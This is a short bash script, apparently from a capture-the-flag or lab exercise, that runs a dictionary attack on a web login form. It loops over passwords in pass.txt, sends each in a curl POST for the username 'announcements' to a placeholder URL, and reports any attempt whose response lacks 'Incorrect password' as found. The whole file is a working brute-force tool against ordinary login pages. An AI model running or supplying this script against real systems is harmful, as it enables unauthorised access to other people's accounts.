#!/bin/bash


for i in $(cat pass.txt)
do
	rep=$(curl -s -i -X POST 'https://YOURURL' --data "username=announcements&password=$i")
	
	if echo "$rep" | grep -q 'Incorrect password'; then
		echo $i "bad password"
	else
		echo $i "we found it"
	fi
done


